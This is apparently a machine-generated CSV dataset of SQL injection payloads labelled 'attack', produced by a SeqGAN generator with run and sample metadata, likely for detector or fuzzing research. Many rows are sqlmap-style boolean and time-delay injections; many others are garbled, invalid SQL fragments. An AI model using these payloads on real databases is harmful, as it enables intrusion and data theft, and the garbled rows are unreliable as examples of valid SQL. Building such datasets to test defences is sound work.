label,payload,family,payload_type,method,run_id,sample_index
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1669
attack,1%then awge' from dual where 5309  =  5309 and 3202  =  like  (  'adbce   as u'sg' like 'nqs,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1670
attack,"1%""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1671
attack,"-1422%'  =  '"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1672
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1673
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1674
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1675
attack,"select +   (  =  2494 or case 9643  =    (  select count  (  3020  =  7182='  (  he  (  select * and    (    (   'bhlx' t  (  select or rdbmbcdecdans  t2,rdbmesysagus t2,all_users gwhereu  ,11   (  *4906+   from sg)kpipes.s t3  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1676
attack,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  '"" where rdb$database  )   from 7078  =  1 +   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1677
attack,"1%when%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1678
attack,"select   (  r  (  'abcdefg',upper  (  3020  )   from rdbmasnsibm.stasibm.systioltabl_users mb,s_users b  (  ger(  char(  5173  (  'abcdefg',t_users t5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1679
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1680
attack,"1%'  )   or 8384  =  like  (  'abtables eriesersat(  cblps dolus as t3  (  chr  (  'abcdefg',5  (  'abcdefg',uppes  (  *  )   or 7427  =  'qzvzq'  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1681
attack,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1682
attack,"1  )   and   (  3020  =  like  (  'abcdefg',ux   (  select rdb$e  ,ale_s(  cirs sysigpip_p_ppessbstabl_users  mandes t4  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1683
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1684
attack,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqpjnqjnd' like ''  =  'vqvz'  =  'tapwv"" like ""k"" like ""s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1685
attack,1'   where 9687  =  1183 --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1686
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1687
attack,1%'   )    )      )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1688
attack,"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1689
attack,"1""   )    )   and or   (  'qomf' like  (  116  )   from 3707  =  dbmbs aors ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1690
attack,1%>sexs'  =  'jrbxm.docalll_xms__susers coll_ustairtall_users s t5  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1691
attack,1%'||  (  select '' where 9687  =  7272 andyperds_bles as rdiesis as t3  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1692
attack,-2925   6846'  =  'jsysywbs sys'  =  'yjws,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1693
attack,"1""   )   or 9643  =    (  select counns t  (  *  geg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'oll_users ions as t3  )   or 'qjle'  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1694
attack,"select 2367' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and '  5127,46(  '   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   ' 1  )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1695
attack,"1""  )   where 0  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1696
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yppper  (  *  b   (  rdobceie_message  (  chr  (  109  )   ables rdb  1ssibm.sys as t2,systains as cdge_stables as geh 8635  =  1 or 5903    =  2494 or 8421  'abcdefg', 5  )  --s rdomas t5s from as t4 or  (  9354  )",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1697
attack,"1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ii'  =  'jaw'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jftyppppe  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1698
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1699
attack,"1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ibcpilldsucns tabdexie_msers t2,as as gendeprere  (  *  )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1700
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  'd,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1701
attack,callege  c,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1702
attack,"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1703
attack,1'+  (  select ''   )    )     )   or 6872  =  6872 and    (    (     (  '_z2pg,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1704
attack,select *   ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1705
attack,1   )    )    as rdbvsagex  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1706
attack,"1'||  (  select 'x' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +',ypessvibm.sypessastas asibm.sysibmblsys  s as domaicdefiess s as g1194 where u5606  (  *  riesersibs el_userrdb4(  3020  =  1 or 1  =$9660  *  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1707
attack,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%   )    )    )    and    )      )   and   (  ""  (  @"" r $1 ""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""  (  'abcdefg',u  (  select cr  (  ""gzhp""  =  5173 or 'qjle'  =  1 and   'qipt'end  (    8459  =  1 or mablas ' like ' t  )  ,5  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1708
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1709
attack,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1710
attack,"1  (  87  )   and   (  3018  =  2332 or  ,5127  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1711
attack,"1""   )from gumagh  8482  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1712
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '""qvq  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1713
attack,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""s where 2494  =  9432,500000000  )  ,9432  (  r 8482execece  (  chr  (  8459  =  3175 or 1  =  8363 or 1vu  )   and bms_pessibm.sysables as g  (  'abcdefg',upper  (  select chre  (  select and 3707  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1714
attack,"select dbms_ s  (  117,al_users agupe  (  1,5000000   )  ,9432  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1715
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1716
attack,"1%'   )   or    )   from_users t5  )   or 1 2072 5333,5000000   a=  1,5000000   )    )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1717
attack,"1  )   adesatkege_m"" like ""as as domaindessagull_users t3  )   and 8312  9607  =  ates as t1,s_ususerds rdt4,ables s  s gt_peconds as t3  (  9354  =  ' count  (  *  s or 9660  =    (  select count  (  *  )   or 6790  =  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1718
attack,1%0+   )    )    )    )    )    and    )      )    )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1719
attack,"1""  )   where * r  (  'qjle'  (  116  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1720
attack,"1""  )   where end  (  2223  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1721
attack,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1722
attack,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1723
attack,1%'   (  select case  (  *  )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1724
attack,"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1725
attack,1%'  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1726
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%   2332,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1727
attack,"1%8156%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1728
attack,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1729
attack,1   )    )    as goz,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1730
attack,1  )   where 5019  ndbles as gehe||c  66  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1731
attack,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'iozavnqa,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1732
attack,"1%a'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vvx",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1733
attack,"1%""   )    )     )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1734
attack,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""ing where 8100  (  '""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""gr",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1735
attack,"c""  (  @"" where 2494  =  8060 or 8635  =    (  select conus t  (  69  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1736
attack,1% end 1,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1737
